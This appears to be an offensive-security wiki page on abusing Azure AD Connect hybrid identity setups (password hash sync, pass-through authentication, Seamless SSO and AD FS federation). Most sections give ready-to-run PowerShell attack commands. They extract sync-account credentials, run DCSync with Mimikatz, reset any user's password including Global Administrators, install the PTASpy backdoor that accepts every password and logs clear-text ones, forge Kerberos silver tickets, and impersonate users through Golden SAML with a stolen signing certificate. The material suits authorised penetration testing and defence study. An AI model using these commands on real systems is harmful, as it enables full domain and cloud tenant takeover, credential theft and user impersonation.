# Azure AD Connect - Hybrid Identity

On-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods. Every method supports Single Sign-on (SSO):

* Password Hash Sync (PHS)
* Pass-Through Authentication (PTA)
* Federation

For each method, at least the user synchronization is done and an account with the name`MSOL_<installationidentifier>` is created on the on-prem AD.

## PHS

* This is the most common method
* Users and a hash of the password hashes are syncronized from the on-prem to AzureAD. However, clear-text passwords or the original hashes aren't sent
* PHS is required for features like Identity Protection and AAD Domain Services.
* Hashes are synchronized every two minutes.
* When an on-prem user wants to access an Azure resource, the authentication takes place on Azure AD.
* Built-in security groups (like domain admins...) are not synced to Azure AD.
* By default, password expiry and account expiry are not sync in Azure AD. So, a user whose on-prem password is expired (not changed) can continue to access Azure resources using the old password.

When PHS is configured some privileged accounts are automatically created:

* The account **`MSOL_<installationID>`** is automatically created in on-prem AD. This account has **replication (DCSync) permissions in the on-prem AD**.
* An account **`Sync_<name of on-prem ADConnect Server>_installationID`** is created in Azure AD. This account can **reset password of ANY user** (synced or cloud only) in Azure AD.

Passwords of the two previous privileged accounts are **stored in SQL server** on the server where **Azure AD Connect is installed.** Admins can extract them in clear-text.

If the server where Azure AD connect is installed is domain joined (recommended in the docs), it's possible to find it with:

```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

### &#x20;From AzureAD to on-prem

```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```

### From on-prem to AzureAD

Compromising the Sync\_\* account it's possible to reset the password of any user (icluding Global Administrators)

```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)

# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbose
```

## PTA

* Passwords aren't synchronized but identities are.
* The authentication is validated on-prem and the communication with cloud is done by an authentication agent (and not the on-prem DC)
* Read more in [https://o365blog.com/post/on-prem\_admin/#pass-through-authentication](https://o365blog.com/post/on-prem\_admin/#pass-through-authentication)

The authentication works like this:

1. To login the user is redirected to Azure AD, where he sends the username and password
2. The credentials are encrypted and set in a queue in Azure AD
3. The on-prem authentication agent gathers the credentials from the queue and decrypts them. This agent is called "Pass-through authentication agent" or PTA agent
4. The agent validates the creds against the on-prem AD and sends the response back to Azure AD which, if the response is positive, completes the login of the user

If an attacker compromises the PDA he can see the credentials gathered from the queue (in clear text). And he can also validate any credentials to the AzureAD (similar attack to Skeleton key).

### From On-Prem to cloud

If you have admin access to the Azure AD Connect server with the PTA agent, you can use the AADInternals module to insert a backdoor that will validate ALL the passwords introduced (so all passwords will be valid for authentication):

```powershell
Install-AADIntPTASpy
```

It's also possible to see the clear-text passwords sent to PTA agent using the following cmdlet on the machine where the previous backdoor was installed:

```powershell
Get-AADIntPTASpyLog -DecodePasswords
```

The DLL used for injection and passwords are stored, by default, in a hidden directory `C:\PTASpy`

## Seamless SSO

* Azure AD Seamless SSO signs users in when they are on a on-prem domain joined PC.
* It's supported by both PHS and PTA
* When Seamless SSO is enabled, a computer account AZUREADSSOACC is created in the on-prem AD. This account's Kerberos decryption key is shared with Azure AD.
* Azure AD exposes an endpoint (https://autologon.microsoftazuread-sso.com) that accepts Kerberos tickets. Domain-joined machine's browser forwards the tickets to this endpoint for SSO.
* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)

### From on-prem to cloud

The password of the user AZUREADSSOACC never changes.

Therefore, a domain admin could compromise the hash of this account, and using it it's possible to create silver tickets to connect to Azure with any on-prem user synced

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'

# Create a silver ticket to connect to Azure
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

More info in [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)

## Federation

* Trust is established between unrelated parties like on-prem Active Directory and Azure AD.
* In Federation, all authentication occurs in the on-prem environment and the user experiences SSO across all the trusted environments.
* Users can access cloud applications by using their on-prem credentials.
*
  * In any federation setup there are three parties: – User or Client\
    – Identity Provider (IdP)\
    – Service Provider (SP)
  * The identity provider authenticates the user and then the user can access a service on the service provider.
  * Security Assertion Markup Language (SAML) is used for exchanging all the authentication and authorization information between the providers.
  * For more info [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

If an attacker can compromise the identity provide he can authorize anything



* AD FS is a claims-based identity model.
* "..claimsaresimplystatements(forexample,name,identity,group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet."
* Claims for a user are written inside the SAML tokens and are then signed to provide confidentiality by the IdP.
* A user is identified by ImmutableID. It is globally unique and stored in Azure AD.
* TheImmuatbleIDisstoredon-premasms-DS-ConsistencyGuidforthe user and/or can be derived from the GUID of the user.
* More info in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML attack:**

* In ADFS, SAML Response is signed by a token-signing certificate.
* If the certificate is compromised, it is possible to authenticate to the Azure AD as ANY user synced to Azure AD!
* Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response.
* The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine.
* More info in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### From on-prem to cloud

```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

It's also possible to create ImmutableID of cloud only users and impersonate them

```powershell
# Create a realistic ImmutableID and set it for a cloud only user 
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
